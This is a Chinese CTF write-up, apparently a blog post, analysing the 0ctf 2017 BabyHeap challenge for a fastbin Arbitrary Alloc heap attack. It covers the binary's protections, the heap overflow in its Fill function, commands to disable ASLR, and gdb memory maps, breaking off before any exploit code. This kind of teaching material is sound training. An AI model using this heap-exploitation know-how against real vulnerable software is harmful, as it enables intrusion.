<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题） | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="题目来源：0ctf 2017 BabyHeap参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36495104&#x2F;article&#x2F;details&#x2F;106202135 #思路CTF-wikihttps:&#x2F;&#x2F;www.yuque.com&#x2F;hxfqg9&#x2F;bin&#x2F;bp97ri#sKWXZ #payloadhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;counsellor&#x2F;article&#x2F;detai">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）">
<meta property="og:url" content="https://cyberangel.cn/2020/11/04/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-3%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="题目来源：0ctf 2017 BabyHeap参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36495104&#x2F;article&#x2F;details&#x2F;106202135 #思路CTF-wikihttps:&#x2F;&#x2F;www.yuque.com&#x2F;hxfqg9&#x2F;bin&#x2F;bp97ri#sKWXZ #payloadhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;counsellor&#x2F;article&#x2F;detai">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-11-04T02:51:15.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:15.109Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/11/04/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-3%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-04T02:51:15.000Z" title="发表于 2020-11-04 10:51:15">2020-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:15.109Z" title="更新于 2021-07-04 17:57:15">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（3-11-3）-fastbin_attack中的Arbitrary Alloc（例题）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/11/04/PWN%E5%85%A5%E9%97%A8%EF%BC%883-11-3%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84Arbitrary%20Alloc%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>题目来源：0ctf 2017 BabyHeap<br>参考资料：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>CTF-wiki<br><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p>
</blockquote>
<hr>
<blockquote>
<p>附件：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>   密码: f1i6<br>–来自百度网盘超级会员 V3 的分享</p>
</blockquote>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>将文件下载下来，首先检查一下文件的保护情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604460372924-ba06d098-7d64-4be8-827a-2527b7ad02bc.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.26.09.png&originHeight=286&originWidth=1080&size=50964&status=done&style=none&width=1080" alt="截屏2020-11-04 11.26.09.png"><br>可以看到保护全部开启<del>（这还玩个毛线啊）</del><br>具体看一下各个保护：<br>Arch:     amd64-64-little</p>
<blockquote>
<p>这个说明程序是 64 位程序，小端序</p>
</blockquote>
<p>RELRO:    Full RELRO</p>
<blockquote>
<p>Full RELRO 开启，使整个 GOT 只读，从而无法被覆盖，进一步来说 GOT 表无法被修改</p>
</blockquote>
<p>Stack:    Canary found</p>
<blockquote>
<p>对使用随机数每个函数进行保护，防止栈溢出</p>
</blockquote>
<p>NX:       NX enabled</p>
<blockquote>
<p>不能向栈上直接注入 shellcode</p>
</blockquote>
<p>PIE:      PIE enabled</p>
<blockquote>
<p>地址随机化，我感觉这个保护是最恶心的</p>
</blockquote>
<p>来看一下我的 Linux 环境：<br>Ubuntu 版本：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604460976126-e9e1650f-f2d0-4db5-a736-1db853410a4c.png#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.36.12.png&originHeight=210&originWidth=722&size=33119&status=done&style=none&width=722" alt="截屏2020-11-04 11.36.12.png"><br>libc 版本：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604461011526-1f933354-89ed-4752-b57d-c164f20abfa8.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.36.48.png&originHeight=212&originWidth=1368&size=55938&status=done&style=none&width=1368" alt="截屏2020-11-04 11.36.48.png"><br>libc 的大致信息以及校验值：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604461084983-b46ff954-d675-46ad-af7f-d8d51294f3b4.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.38.02.png&originHeight=178&originWidth=1236&size=48295&status=done&style=none&width=1236" alt="截屏2020-11-04 11.38.02.png"></p>
<blockquote>
<p>其中 libc-2.23.so 是我本机的 libc 文件，main_arena 这个工具的下载链接见上一小节的文章</p>
</blockquote>
<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>整个程序相当于一个堆内存管理器，静态分析一下吧：</p>
<h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604461620274-048b82a2-c7c4-4a5c-ad72-f9e74264a755.png#align=left&display=inline&height=1046&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.46.55.png&originHeight=1046&originWidth=1244&size=181267&status=done&style=none&width=1244" alt="截屏2020-11-04 11.46.55.png"><br>main 函数主要是通过我们的输入来控制程序的流程，这里就不在多说。</p>
<h2 id="get-addr-函数（生成随机地址）"><a href="#get-addr-函数（生成随机地址）" class="headerlink" title="get_addr 函数（生成随机地址）"></a>get_addr 函数（生成随机地址）</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604461799695-7946b288-81dc-45d7-ab7e-506fcf305e3c.png#align=left&display=inline&height=730&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.49.55.png&originHeight=730&originWidth=2004&size=260701&status=done&style=none&width=2004" alt="截屏2020-11-04 11.49.55.png"><br>这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。<br>还需要提一句的是，这个函数有 alarm 函数，从程序运行 60 秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行 patch。patch 之后的可执行文件名为：babyheap_0ctf_2017_patch</p>
<h2 id="menu-函数"><a href="#menu-函数" class="headerlink" title="menu 函数"></a>menu 函数</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604462349376-204eb458-25b1-458b-9a79-5e9678dd413b.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2011.59.04.png&originHeight=264&originWidth=378&size=45393&status=done&style=none&width=378" alt="截屏2020-11-04 11.59.04.png"><br>打印出程序的基本界面，方便攻击者攻击程序（不是）</p>
<h2 id="Allocate-函数（开辟堆空间）"><a href="#Allocate-函数（开辟堆空间）" class="headerlink" title="Allocate 函数（开辟堆空间）"></a>Allocate 函数（开辟堆空间）</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604462592469-5b066e01-0bbd-4a59-8839-8c15b5d278ca.png#align=left&display=inline&height=780&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-04%2012.03.08.png&originHeight=780&originWidth=952&size=156345&status=done&style=none&width=952" alt="截屏2020-11-04 12.03.08.png"><br>allocate 函数是来创建堆块的，申请 chunk 最大的大小为 4096。<br>首先输入堆块的 content_size，然后调用 calloc 函数根据输入的 content_size 大小来创建堆块，最后堆块的信息保存在 get_addr 指针所指向的地址中。<strong>需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为<code>\x00</code>。</strong></p>
<blockquote>
<p><strong>请注意，堆块的 index 是从 0 开始的</strong><br>因此程序的结构体为：</p>
<ul>
<li>chunk_flag:用来判断堆块是否存在</li>
<li>chunk_content_size:#记录 content 的大小</li>
<li>chunk_data_ptr:指向 calloc 出来的 chunk_data</li>
</ul>
</blockquote>
<h2 id="Fill-函数（填充堆内容）"><a href="#Fill-函数（填充堆内容）" class="headerlink" title="Fill 函数（填充堆内容）"></a>Fill 函数（填充堆内容）<img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604565426679-e5d20a72-8856-4c02-bcfb-5e207f273188.png#align=left&display=inline&height=512&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2016.37.02.png&originHeight=512&originWidth=1090&size=97833&status=done&style=none&width=1090" alt="截屏2020-11-05 16.37.02.png"></h2><p>上图是 Fill 函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。<br>在填充内容的功能中，调用 input 函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了 content_size<strong>，但是程序并没有将原来结构体中的 content_size 更改。且执行这个函数之后 allocate chunk 时堆块的 size 域没有改变，所以这里就出现了任意堆溢出的情形。</strong></p>
<h2 id="Free-函数（释放堆空间）"><a href="#Free-函数（释放堆空间）" class="headerlink" title="Free 函数（释放堆空间）"></a>Free 函数（释放堆空间）</h2><p>**<img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604565644300-8162b98e-4b74-47ba-bda5-987d2ad5b167.png#align=left&display=inline&height=406&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2016.40.39.png&originHeight=406&originWidth=1090&size=95320&status=done&style=none&width=1090" alt="截屏2020-11-05 16.40.39.png">**这个函数没有漏洞存在，只是调用了 input 函数让我们输入堆块的 index，从而释放指定的堆块。</p>
<h2 id="Dump-函数（打印堆内容）"><a href="#Dump-函数（打印堆内容）" class="headerlink" title="Dump 函数（打印堆内容）"></a>Dump 函数（打印堆内容）</h2><p>这个函数的内容很简单，就只是用来打印堆块的内容而已。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604566063024-ee8c21c4-daf4-4498-818a-02e026636500.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2016.47.05.png&originHeight=372&originWidth=1394&size=84628&status=done&style=none&width=1394" alt="截屏2020-11-05 16.47.05.png"></p>
<h1 id="gdb-动态调试"><a href="#gdb-动态调试" class="headerlink" title="gdb 动态调试"></a>gdb 动态调试</h1><p>还记得之前 get_addr 这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。</p>
<h2 id="关闭-ALSR-保护"><a href="#关闭-ALSR-保护" class="headerlink" title="关闭 ALSR 保护"></a>关闭 ALSR 保护</h2><p>由于这个程序开启了 PIE 保护，为了方便调试程序及查看堆内存，因此我们将 Linux 的 ALSR(地址空间随机化)进行关闭。首先看一下 ALSR 开启的状态，可以使用下面的任意其中一种命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br><span class="line">ubuntu@ubuntu:~$ sysctl -a --pattern randomize</span><br><span class="line">kernel.randomize_va_space = 2</span><br><span class="line">ubuntu@ubuntu:~$</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">0 = 关闭</span><br><span class="line">1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）</span><br><span class="line">2 = 全随机。除了1中所述，还有heap。</span><br><span class="line"><span class="comment">###</span></span><br></pre></td></tr></table></figure>

<p>ASLR 开启，动态库的加载地址不同：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604568118045-868f2445-41b3-41b6-a2ee-ca197392cef4.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2017.21.55.png&originHeight=318&originWidth=1328&size=64027&status=done&style=none&width=1328" alt="截屏2020-11-05 17.21.55.png"></p>
<hr>
<p>现在关闭 ASLR，关闭方法如下：<br><strong>方法一： 手动修改 randomize_va_space 文件</strong><br>上面介绍的 randomize_va_space 文件的枚举值含义，设置的值不同，linux 内核加载程序的地址空间的策略就会不同。比较简单明了。这里 0 代表关闭 ASLR。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment">#注意，这里是先进root权限，后执行。</span></span><br><span class="line"><span class="comment">#重启之后会恢复默认。</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二： 使用 sysctl 控制 ASLR</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment">#重启之后将恢复默认</span></span><br><span class="line"><span class="comment">#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。</span></span><br></pre></td></tr></table></figure>

<p><strong>方法三： 使用 setarch 控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的 ASLR，使用 setarch 是很好的选择。setarch 命令如其名，改变程序的运行架构环境，并可以自定义环境 flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setarch `uname -m` -R ./your_program</span><br><span class="line"><span class="comment">#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)</span></span><br></pre></td></tr></table></figure>

<p><strong>方法四： 在 GDB 场景下，使用 set disable-randomization off</strong><br>在调试特定程序时，可以通过 set disable-randomization 命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是 on 状态。<br>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关闭ASLR：</span><br><span class="line"><span class="built_in">set</span> disable-randomization on</span><br><span class="line">开启ASLR：</span><br><span class="line"><span class="built_in">set</span> disable-randomization off</span><br><span class="line">查看ASLR状态：</span><br><span class="line">show disable-randomization</span><br></pre></td></tr></table></figure>

<hr>
<p>现在，我们关闭 ASLR：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604568747069-d2c1a2bd-0a93-43d3-a4a9-3332ec3939d1.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2017.32.21.png&originHeight=286&originWidth=1268&size=51041&status=done&style=none&width=1268" alt="截屏2020-11-05 17.32.21.png"><br>退出管理员权限，再来看一下 ALSR<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604568825320-e55f1e25-6381-40ed-a210-ac6e16ec71a2.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-05%2017.33.41.png&originHeight=382&originWidth=1326&size=76801&status=done&style=none&width=1326" alt="截屏2020-11-05 17.33.41.png"><br>从上图中可以看到：ASLR 关闭时，动态库的加载地址相同。<br>我们如何找到那个随机地址呢？通过多次对程序 gdb 调试，发现了一直变化的地址（此时的 ASLR 已关闭，参见下文章下面的内容），下面的代码框之中是两次 gdb 调试的内存分布：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x1d0f97e2c000</span>     <span class="number">0x1d0f97e2d000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd9000</span>     <span class="number">0x7ffff7fdc000</span> rw-p     <span class="number">3000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | 